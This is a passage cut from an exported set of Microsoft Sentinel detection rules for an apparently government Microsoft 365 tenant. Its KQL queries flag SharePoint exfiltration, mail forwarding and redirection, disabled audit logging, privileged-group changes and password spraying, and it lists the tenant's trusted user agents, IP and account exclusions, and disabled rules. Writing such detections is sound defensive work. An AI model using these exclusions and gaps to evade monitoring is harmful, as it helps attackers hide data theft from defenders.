365,IaaS,Windows\nMITRE:TA0006;T1110;T1110.004","alertRuleTemplateName":"83ba3057-9ea3-4759-bf6a-933f2e5bc7ee","lastModifiedUtc":"2024-10-02T21:15:12.8888142Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/da443195-0aca-478a-872b-a757403b1493","name":"da443195-0aca-478a-872b-a757403b1493","etag":"\"0e00af1d-0000-2700-0000-627172290000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P14D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let threshold = 5; \nlet szSharePointFileOperation = \"SharePointFileOperation\"; \nlet szOperations = dynamic([\"FileDownloaded\", \"FileUploaded\"]); \nlet starttime = 14d; \nlet endtime = 1d; \nlet TrustedUserAgent = dynamic([\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36 Edg/99.0.1150.55\", \"O365 Planner Task Service v16.0.15118.40750\", \"Exchange/15.20.5081.29/Outlook Web App\", \"Exchange/15.20.5081.28/Outlook Web App\",\"OneDriveiOSApp/13.8.1 (iOS/15.4; en_US; Apple/iPhone)\", \"OneDriveiOSApp/13.7 (iOS/15.4.1; en_US; Apple/iPhone)\", \"O365 Planner Task Service v16.0.15118.40750\", \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36\", \"O365 Planner Task Service v16.0.15122.40750\"]);\nlet historicalActivity = \n    OfficeActivity \n    | where TimeGenerated between(ago(starttime) .. ago(endtime)) \n    | where RecordType =~ szSharePointFileOperation \n    | where Operation in~ (szOperations) \n    | where isnotempty(UserAgent) \n    | summarize historicalCount = count() by UserAgent, RecordType, Operation; \nlet recentActivity = OfficeActivity \n    | where RecordType =~ szSharePointFileOperation \n    | where Operation in~ (szOperations) \n    | where TimeGenerated > ago(endtime) \n    | where isnotempty(UserAgent) \n    | summarize min(Start_Time), max(Start_Time), recentCount = count() by UserAgent, RecordType, Operation; \nlet RareUserAgent = recentActivity \n    | join kind = leftanti (historicalActivity) on UserAgent \n    | order by recentCount desc, UserAgent \n    // More than 5 downloads/uploads from a new user agent today \n    | where recentCount > threshold; \nOfficeActivity  \n| where TimeGenerated > ago(endtime)  \n| where RecordType =~ szSharePointFileOperation  \n| where Operation in~ (szOperations) \n| where isnotempty(UserAgent) \n| join kind= inner (RareUserAgent) \n    on UserAgent, RecordType, Operation     \n| where Start_Time between(min_Start_Time .. max_Start_Time)\n| extend Files = pack(\"Site_Url\", Site_Url, \"SourceFileName\", SourceFileName)\n| summarize max(TimeGenerated), Files =make_set(Files, 100), Count=count() by UserId, ClientIP, RecordType, EventSource, OfficeWorkload, Operation, UserAgent\n| extend PersonalOneDrive = iif (Files has strcat(\"https://dod365-my.sharepoint-mil.us/personal/\", split(UserId, '.')[0], '_', split(UserId, '.')[1], '_', split(UserId, '.')[2]), \"True\", \"False\")\n| where UserAgent !in (TrustedUserAgent) or Count > 20\n| where not(ClientIP startswith \"140.\" and PersonalOneDrive == \"True\" and Count < 10)","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"UserId"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"ClientIP"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Exfiltration"],"techniques":["T1030"],"displayName":"SharePointFileOperation via devices with previously unseen user agents","enabled":false,"description":"Identifies if the number of documents uploaded or downloaded from device(s) associated\nwith a previously unseen user agent exceeds a threshold (default is 5).","alertRuleTemplateName":"5dd76a87-9f87-4576-bab3-268b0e2b338b","lastModifiedUtc":"2022-05-03T18:19:21.2527148Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/cfec4116-9cc3-4209-8d18-beef162f49b9","name":"cfec4116-9cc3-4209-8d18-beef162f49b9","etag":"\"8700833c-0000-2700-0000-66fdbfaf0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let timeframe = 1d;\nOfficeActivity\n| where TimeGenerated >= ago(timeframe)\n| where OfficeWorkload == \"Exchange\"\n| where Operation in~ (\"New-TransportRule\", \"Set-TransportRule\")\n| extend p = parse_json(Parameters)\n| extend RuleName = case(\n  Operation =~ \"Set-TransportRule\", tostring(OfficeObjectId),\n  Operation =~ \"New-TransportRule\", tostring(p[1].Value),\n  \"Unknown\"\n  ) \n| mvexpand p\n| where (p.Name =~ \"BlindCopyTo\" or p.Name =~ \"RedirectMessageTo\") and isnotempty(p.Value)\n| extend RedirectTo = p.Value\n| extend ClientIPOnly = case( \n  ClientIP has \".\" and ClientIP has \":\", tostring(split(ClientIP,\":\")[0]), \n  ClientIP has \".\" and ClientIP has \"-\", tostring(split(ClientIP,\"-\")[0]), \n  ClientIP has \"[\", tostring(trim_start(@'[[]',tostring(split(ClientIP,\"]\")[0]))),\n  ClientIP\n  )  \n| extend Port = case(\n  ClientIP has \".\" and ClientIP has \":\", (split(ClientIP,\":\")[1]),\n  ClientIP has \".\" and ClientIP has \"-\", (split(ClientIP,\"-\")[1]),\n  ClientIP has \"[\" and ClientIP has \":\", tostring(split(ClientIP,\"]:\")[1]),\n  ClientIP has \"[\" and ClientIP has \"-\", tostring(split(ClientIP,\"]-\")[1]),\n  ClientIP\n  )\n| extend ClientIP = ClientIPOnly\n| project TimeGenerated, RedirectTo, ClientIP, Port, UserId, Operation, RuleName\n| extend timestamp = TimeGenerated, AccountCustomEntity = UserId, IPCustomEntity = ClientIP","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountCustomEntity"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPCustomEntity"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Collection","Exfiltration"],"techniques":["T1114","T1020"],"displayName":"Mail redirect via ExO transport rule","enabled":true,"description":"Identifies when Exchange Online transport rule configured to forward emails.\nThis could be an adversary mailbox configured to collect mail from multiple user accounts.\nPLATFORM:Microsoft 365,IaaS\nMITRE:TA0003;T1098;T1098.002,TA0005;T1562;T1562.008,TA0009;T1114;T1114.002;T1114.003","alertRuleTemplateName":"500415fb-bba7-4227-a08a-9857fb61b6a7","lastModifiedUtc":"2024-10-02T21:48:29.5432989Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/1370097e-958b-441a-9c14-3e9c761ba22f","name":"1370097e-958b-441a-9c14-3e9c761ba22f","etag":"\"87003d50-0000-2700-0000-66fdc10a0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let timeframe = 1d;\nOfficeActivity\n| where TimeGenerated >= ago(timeframe)\n| where UserType in~ (\"Admin\",\"DcAdmin\") \n// Only admin or global-admin can disable audit logging\n| where Operation =~ \"Set-AdminAuditLogConfig\" \n| extend AdminAuditLogEnabledValue = tostring(parse_json(tostring(parse_json(tostring(array_slice(parse_json(Parameters),3,3)))[0])).Value)\n| where AdminAuditLogEnabledValue =~ \"False\" \n| summarize StartTimeUtc = min(TimeGenerated), EndTimeUtc = max(TimeGenerated), OperationCount = count() by Operation, UserType, UserId, ClientIP, ResultStatus, Parameters, AdminAuditLogEnabledValue\n| extend timestamp = StartTimeUtc, AccountCustomEntity = UserId, IPCustomEntity = ClientIP","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountCustomEntity"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPCustomEntity"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["DefenseEvasion"],"techniques":["T1562"],"displayName":"Exchange AuditLog disabled","enabled":true,"description":"Identifies when the exchange audit logging has been disabled which may be an adversary attempt\nto evade detection or avoid other defenses.\nPLATFORM:Microsoft 365,IaaS\nMITRE:TA0003;T1098;T1098.002,TA0005;T1562;T1562.008","alertRuleTemplateName":"194dd92e-d6e7-4249-85a5-273350a7f5ce","lastModifiedUtc":"2024-10-02T21:54:17.0493736Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/5190ac07-1c6f-4ec3-9d22-e01b8d9bc729","name":"5190ac07-1c6f-4ec3-9d22-e01b8d9bc729","etag":"\"d600c78f-0000-2700-0000-65a7cd7a0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P7D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let timeframe = 90d;\nOfficeActivity\n| where TimeGenerated >= ago(timeframe)\n| where Operation =~ \"Set-Mailbox\"\n| where Parameters has \"ForwardingSmtpAddress\"\n| extend parsed = parse_json(Parameters)\n| mv-expand parsed\n| where parsed.Name == \"ForwardingSmtpAddress\"\n| extend parameterName = tostring(parsed.Name), fwdingDestination = tostring(parsed.Value)\n| where isnotempty(fwdingDestination)\n| extend ClientIPOnly = case( \nClientIP has \".\" and ClientIP has ':', tostring(split(ClientIP,\":\")[0]), \nClientIP has \".\" and ClientIP has '-', tostring(split(ClientIP,\"-\")[0]), \nClientIP has ']-', tostring(trim_start(@'[[]',tostring(split(ClientIP,\"]\")[0]))),\nClientIP has ']:', tostring(trim_start(@'[[]',tostring(split(ClientIP,\"]\")[0]))),\nisempty(ClientIP) and ClientIP_ has \".\" and ClientIP_ has ':', tostring(split(ClientIP_,\":\")[0]), \nisempty(ClientIP) and ClientIP_ has \".\" and ClientIP_ has '-', tostring(split(ClientIP_,\"-\")[0]), \nisempty(ClientIP) and ClientIP_ has ']-', tostring(trim_start(@'[[]',tostring(split(ClientIP_,\"]\")[0]))),\nisempty(ClientIP) and ClientIP_ has ']:', tostring(trim_start(@'[[]',tostring(split(ClientIP_,\"]\")[0]))),\nisnotempty(ClientIP), ClientIP,\nisnotempty(ClientIP_), ClientIP_,\n\"IP Not Available\"\n)  \n| extend Port = case(\nClientIP has \".\" and ClientIP has ':', tostring(split(ClientIP,\":\")[1]), \nClientIP has \".\" and ClientIP has '-', tostring(split(ClientIP,\"-\")[1]), \nClientIP has ']-', tostring(split(ClientIP,\"]-\")[1]), \nClientIP has ']:', tostring(split(ClientIP,\"]:\")[1]), \nisempty(ClientIP) and ClientIP_ has \".\" and ClientIP_ has ':', tostring(split(ClientIP_,\":\")[1]), \nisempty(ClientIP) and ClientIP_ has \".\" and ClientIP_ has '-', tostring(split(ClientIP_,\"-\")[1]), \nisempty(ClientIP) and ClientIP_ has ']-', tostring(split(ClientIP_,\"]-\")[1]),\nisempty(ClientIP) and ClientIP_ has ']:', tostring(split(ClientIP_,\"]:\")[1]),\nisnotempty(ClientIP), ClientIP,\nisnotempty(ClientIP_), ClientIP_,\n\"IP Not Available\"\n)\n| summarize StartTimeUtc = min(TimeGenerated), EndTimeUtc = max(TimeGenerated), DistinctUserCount = dcount(UserId), UserId = make_set(UserId),\nPorts = make_set(Port), EventCount = count(), ClientIPOnly = make_set(ClientIPOnly) by fwdingDestination\n| where DistinctUserCount > 1\n| mv-expand UserId\n| extend fwdingDestination = tostring(split(fwdingDestination, \"smtp:\")[1])\n| extend UserId = iif(UserId contains \"on behalf\", split(UserId, \"on behalf of \")[0], UserId)\n| extend UserId = tostring(UserId), Ports = tostring(Ports), ClientIPOnly = tostring(ClientIPOnly)\n| distinct StartTimeUtc, EndTimeUtc, UserId, DistinctUserCount, Ports, fwdingDestination, EventCount, ClientIPOnly\n| extend timestamp = StartTimeUtc","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":false,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"UserId"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Collection","Exfiltration"],"techniques":["T1114","T1020"],"displayName":"Multiple users email forwarded to same destination v2","enabled":false,"description":" Identifies when multiple (more than one) users mailboxes are configured to forward to the same destination. \nThis could be an attacker-controlled destination mailbox configured to collect mail from multiple compromised user accounts. (Version 2 notes: Fixed the summarize operation. The summarize operation was summarizing by fwdingmailbox and IP. Just because the same ClientIPs are used on two different accounts being forwarded to the same place, does not mean we shouldn't see it.\nThis analytic is looking for mutliple forwarded mailboxes to same location regardless of IP address.)","alertRuleTemplateName":"871ba14c-88ef-48aa-ad38-810f26760ca3","lastModifiedUtc":"2024-01-17T12:52:09.9799504Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/c9d65cd0-7b62-4620-8b44-fcb2b70a185e","name":"c9d65cd0-7b62-4620-8b44-fcb2b70a185e","etag":"\"86036df8-0000-2700-0000-647f36c50000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"P14D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let threshold = 50;\nlet szSharePointFileOperation = \"SharePointFileOperation\";\nlet szOperations = dynamic([\"FileDownloaded\", \"FileUploaded\"]);\nlet starttime = 14d;\nlet endtime = 1h;\nlet historicalActivity =\n    OfficeActivity\n    | where TimeGenerated between(ago(starttime) .. ago(endtime))\n    | where RecordType =~ szSharePointFileOperation\n    | where Operation in~ (szOperations)\n    | summarize historicalCount = count() by ClientIP, RecordType, Operation;\nlet recentActivity = OfficeActivity\n    | where TimeGenerated > ago(endtime)\n    | where RecordType =~ szSharePointFileOperation\n    | where Operation in~ (szOperations)\n    | summarize min(Start_Time), max(Start_Time), recentCount = count() by ClientIP, RecordType, Operation;\nlet RareIP = recentActivity\n    | join kind= leftanti (historicalActivity) on ClientIP, RecordType, Operation\n    // More than 50 downloads/uploads from a new IP\n    | where recentCount > threshold;\nOfficeActivity\n| where TimeGenerated >= ago(endtime)\n| where RecordType =~ szSharePointFileOperation\n| where Operation in~ (szOperations)\n| join kind= inner (RareIP) on ClientIP, RecordType, Operation\n| where Start_Time between(min_Start_Time .. max_Start_Time)\n| summarize StartTimeUtc = min(min_Start_Time), EndTimeUtc = max(max_Start_Time)\n    by\n    RecordType,\n    Operation,\n    UserType,\n    UserId,\n    ClientIP,\n    OfficeWorkload,\n    Site_Url,\n    OfficeObjectId,\n    UserAgent,\n    TotalFiles = recentCount\n| extend\n    TimeGenerated = StartTimeUtc,\n    UserAccount = UserId,\n    IPCustomEntity = ClientIP,\n    Site_URL = Site_Url\n| summarize IPsList = make_list(IPCustomEntity)\n    by\n    TimeGenerated,\n    UserAccount,\n    Site_URL,\n    RecordType,\n    Operation,\n    UserType,\n    OfficeWorkload,\n    UserAgent,\n    StartTimeUtc,\n    EndTimeUtc,\n    TotalFiles\n| extend IP = IPsList\n| mv-expand IP\n| distinct\n    TimeGenerated,\n    UserAccount,\n    tostring(IP),\n    TotalFiles,\n    Site_URL,\n    RecordType,\n    Operation,\n    UserType,\n    OfficeWorkload,\n    UserAgent,\n    StartTimeUtc,\n    EndTimeUtc","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"UserAccount"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IP"}]},{"entityType":"URL","fieldMappings":[{"identifier":"Url","columnName":"Site_URL"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Exfiltration"],"techniques":["T1030"],"displayName":"SharePointFileOperation via previously unseen IPs V 2.0","enabled":false,"description":"Identifies when the volume of documents uploaded to or downloaded from Sharepoint by new IP addresses\nexceeds a threshold (default is 50).","alertRuleTemplateName":"4b11568b-3f5f-4ba1-80c8-7f1dc8390eb7","lastModifiedUtc":"2023-06-06T13:38:13.6439005Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/b73f0088-f106-4988-8062-699eb9e29c28","name":"b73f0088-f106-4988-8062-699eb9e29c28","etag":"\"59003f1b-0000-2700-0000-62cc54cc0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Low","query":"let timeframe = 8h;\nlet exclusions = dynamic([\"SpoolsProvisioning-ApplicationAccount@NAMP111.PROD.OUTLOOK.COM,52.182.49.149\", \"SpoolsProvisioning-ApplicationAccount@NAMP111.PROD.OUTLOOK.COM,52.182.49.195\"]);\n// This filters records that have \"UserSMimeCertificate\", \"UserCertificate\", and \"ForwardingSmtpAddress\" fields in the Parameters. These do not appear to have a security importance as the fields are blank. The first two *may* be related to migrations. Forwarding is disabled to external domains.\nlet ParamsExcluded = dynamic([\"UserSMimeCertificate\", \"UserCertificate\", \"ForwardingSmtpAddress\"]);\nOfficeActivity\n| where TimeGenerated >= ago(timeframe)\n| where Operation in~ (\"Add-MailboxPermission\", \"Add-MailboxFolderPermission\", \"Set-Mailbox\", \"New-ManagementRoleAssignment\")\n    and not(UserId has_any ('NT AUTHORITY\\\\SYSTEM (Microsoft.Exchange.ServiceHost)', 'devilfish-applicationaccount') and Operation in~ (\"Add-MailboxPermission\", \"Set-Mailbox\"))\n| extend timestamp = TimeGenerated, InitiatedBy = UserId, ActionAccountSrcIP = ClientIP\n| project TimeGenerated, InitiatedByIP = iff(ClientIP contains_cs \":\", split(ClientIP, \":\")[0], split(ClientIP, \"-\")[0]), ActionAccountSrcIP, InitiatedBy, RecordType, Operation, TargetedMbx = OfficeObjectId, ParamsModified = Parameters\n| extend client_pair = strcat(InitiatedBy, \",\", InitiatedByIP)\n| where client_pair !in~ (exclusions)\n// This is the App ID for the Identity-Graph-API-Connector - believed to be used for migrations\n| where InitiatedBy !contains \"234797b6-5624-4e53-8f94-45c02d08e86d\"\n| extend Params1 = parse_json(ParamsModified).[1].Name\n| where Params1 !in~ (ParamsExcluded)\n| project-away client_pair, ActionAccountSrcIP","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"InitiatedBy"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"InitiatedByIP"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Persistence","Collection"],"techniques":["T1098","T1114"],"displayName":"Rare and potentially high-risk Office operations","enabled":false,"description":"Identifies Office operations that are typically rare and can provide capabilities useful to attackers. Examples include; changing/modifying mailbox permissions.","alertRuleTemplateName":"957cb240-f45d-4491-9ba5-93430a3c08be","lastModifiedUtc":"2022-07-11T16:50:20.2203451Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/32c9cfbe-991e-44d9-bdbf-c7977308c891","name":"32c9cfbe-991e-44d9-bdbf-c7977308c891","etag":"\"850025cb-0000-2700-0000-66fdab4b0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"// If access was granted by a User (InitiatedByDisplayName), app information will say **User**\n// If access was granted by an app (AppId), this information will display for the application used.\n// Currently, this analytic is set to remove entries set by App \"MS-PIM-Fairfax\"\nlet timeframe = 24h;\nlet OperationList = dynamic([\"Add member to role\", \"Add member to role in PIM requested (permanent)\"]);\nlet PrivilegedGroups = dynamic([\"UserAccountAdmins\",\"PrivilegedRoleAdmins\",\"TenantAdmins\"]);\nAuditLogs\n| where TimeGenerated >= ago(timeframe)\n| where LoggedByService =~ \"Core Directory\"\n| where Category =~ \"RoleManagement\"\n| where OperationName in~ (OperationList)\n| mv-expand TargetResources\n| extend modifiedProperties = parse_json(TargetResources).modifiedProperties\n| mv-expand modifiedProperties\n| extend\n    DisplayName = tostring(parse_json(modifiedProperties).displayName),\n    GroupName =  trim(@'\"', tostring(parse_json(modifiedProperties).newValue))\n| extend\n    AppId = iif(isnotnull(InitiatedBy.app.appId), InitiatedBy.app.appId, \"**User**\"),\n    InitiatedByUserId = iif(isnotnull(InitiatedBy.user.id), InitiatedBy.user.id, \"**See AppInitiated Column**\"),\n    InitiatedByDisplayName = iif(isnotnull(InitiatedBy.app.displayName), InitiatedBy.app.displayName, InitiatedBy.user.userPrincipalName),\n    ServicePrincipalId = iif(isnotnull(InitiatedBy.app.servicePrincipalId), InitiatedBy.app.servicePrincipalId, \"**User**\"),\n    ServicePrincipalName = iif(isnotnull(InitiatedBy.app.servicePrincipalName), InitiatedBy.app.servicePrincipalName, \"**User**\"),\n    TargetUserAdded = iif(isempty(TargetResources.userPrincipalName), TargetResources.displayName, TargetResources.userPrincipalName)\n| where DisplayName =~ \"Role.WellKnownObjectName\"\n| where GroupName contains \"admins\" or GroupName in (PrivilegedGroups)\n// If you want to still alert for operations from PIM, remove below filtering for MS-PIM.\n| where InitiatedByDisplayName != \"MS-PIM-Fairfax\"\n| extend AppInitiated = pack(\"AppId\", AppId, \"ServicePrincipalId\", ServicePrincipalId, \"ServicePrincipalName\", ServicePrincipalName)\n| summarize Groups =make_list(GroupName), Count =count()\n    by\n    AADOperationType,\n    OperationName,\n    AADTenantId,\n    tostring(TargetUserAdded),\n    InitiatedByUserId,\n    tostring(InitiatedByDisplayName),\n    tostring(AppInitiated)\n| sort by Count","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"TargetUserAdded"}]},{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"InitiatedByDisplayName"}]},{"entityType":"SecurityGroup","fieldMappings":[{"identifier":"DistinguishedName","columnName":"Groups"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Persistence","PrivilegeEscalation"],"techniques":["T1098","T1078"],"displayName":"User added to Azure Active Directory Privileged Groups","enabled":true,"description":"This will alert when a user is added to any of the Privileged Groups.\nFor further information on AuditLogs please see https://docs.microsoft.com/azure/active-directory/reports-monitoring/reference-audit-activities.\nFor Administrator role permissions in Azure Active Directory please see https://docs.microsoft.com/azure/active-directory/users-groups-roles/directory-assign-admin-roles\nPLATFORM:Azure AD,IaaS,Microsoft 365,Windows\nMITRE:TA0001;T1078;T1078.001;T1078.004,TA0003;T1078;T1078.004;T1098;T1098.001","alertRuleTemplateName":"4d94d4a9-dc96-410a-8dea-4d4d4584188b","lastModifiedUtc":"2024-10-02T20:21:30.659471Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/ef41fca5-f138-4892-8a00-88904aabf472","name":"ef41fca5-f138-4892-8a00-88904aabf472","etag":"\"8600bfe0-0000-2700-0000-66fdb9d10000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let timeRange = 3d;\nlet lookBack = 7d;\nlet authenticationWindow = 20m;\nlet authenticationThreshold = 5;\nlet isGUID = \"[0-9a-z]{8}-[0-9a-z]{4}-[0-9a-z]{4}-[0-9a-z]{4}-[0-9a-z]{12}\";\nlet failureCodes = dynamic([50053, 50126, 50055]); // invalid password, account is locked - too many sign ins, expired password\nlet successCodes = dynamic([0, 50055, 50057, 50155, 50105, 50133, 50005, 50076, 50079, 50173, 50158, 50072, 50074, 53003, 53000, 53001, 50129]);\n// Lookup up resolved identities from last 7 days\nlet identityLookup = SigninLogs\n| where TimeGenerated >= ago(lookBack)\n| where not(Identity matches regex isGUID)\n| where isnotempty(UserId)\n| summarize by UserId, lu_UserDisplayName = UserDisplayName, lu_UserPrincipalName = UserPrincipalName;\n// collect window threshold breaches\nSigninLogs\n| where TimeGenerated > ago(timeRange)\n| where ResultType in(failureCodes)\n| summarize StartTime = min(TimeGenerated), EndTime = max(TimeGenerated), make_set(ClientAppUsed), count() by bin(TimeGenerated, authenticationWindow), IPAddress, AppDisplayName, UserPrincipalName\n| summarize FailedPrincipalCount = dcount(UserPrincipalName) by bin(TimeGenerated, authenticationWindow), IPAddress, AppDisplayName\n| where FailedPrincipalCount >= authenticationThreshold\n| summarize WindowThresholdBreaches = count() by IPAddress\n| join kind= inner (\n// where we breached a threshold, join the details back on all failure data\n SigninLogs\n| where TimeGenerated > ago(timeRange)\n| where ResultType in(failureCodes)\n| extend FullLocation = strcat(Location,'|', LocationDetails.state, '|', LocationDetails.city)\n| summarize StartTime = min(TimeGenerated), EndTime = max(TimeGenerated), make_set(ClientAppUsed), make_set(FullLocation), FailureCount = count() by IPAddress, AppDisplayName, UserPrincipalName, UserDisplayName, Identity, UserId\n// lookup any unresolved identities\n| extend UnresolvedUserId = iff(Identity matches regex isGUID, UserId, \"\")\n| join kind= leftouter (\n identityLookup \n) on $left.UnresolvedUserId==$right.UserId\n| extend UserDisplayName=iff(isempty(lu_UserDisplayName), UserDisplayName, lu_UserDisplayName)\n| extend UserPrincipalName=iff(isempty(lu_UserPrincipalName), UserPrincipalName, lu_UserPrincipalName)\n| summarize StartTime = min(StartTime), EndTime = max(EndTime), make_set(UserPrincipalName), make_set(UserDisplayName), make_set(set_ClientAppUsed), make_set(set_FullLocation), make_list(FailureCount) by IPAddress, AppDisplayName\n| extend FailedPrincipalCount = arraylength(set_UserPrincipalName)\n) on IPAddress\n| project IPAddress, StartTime, EndTime, TargetedApplication=AppDisplayName, FailedPrincipalCount, UserPrincipalNames=set_UserPrincipalName, UserDisplayNames=set_UserDisplayName, ClientAppsUsed=set_set_ClientAppUsed, Locations=set_set_FullLocation, FailureCountByPrincipal=list_FailureCount, WindowThresholdBreaches\n| join kind= inner (\nSigninLogs // get data on success vs. failure history for each IP\n| where TimeGenerated > ago(timeRange)\n| where ResultType in(successCodes) or ResultType in(failureCodes) // success or failure types\n| summarize GlobalSuccessPrincipalCount = dcountif(UserPrincipalName, (ResultType in(successCodes))), ResultTypeSuccesses = make_set_if(ResultType, (ResultType in(successCodes))), GlobalFailPrincipalCount = dcountif(UserPrincipalName, (ResultType in(failureCodes))), ResultTypeFailures = make_set_if(ResultType, (ResultType in(failureCodes))) by IPAddress\n| where GlobalFailPrincipalCount > GlobalSuccessPrincipalCount // where the number of failed principals is greater than success - eliminates FPs from IPs who authenticate successfully alot and as a side effect have alot of failures\n) on IPAddress\n| project-away IPAddress1\n| extend timestamp=StartTime, IPCustomEntity = 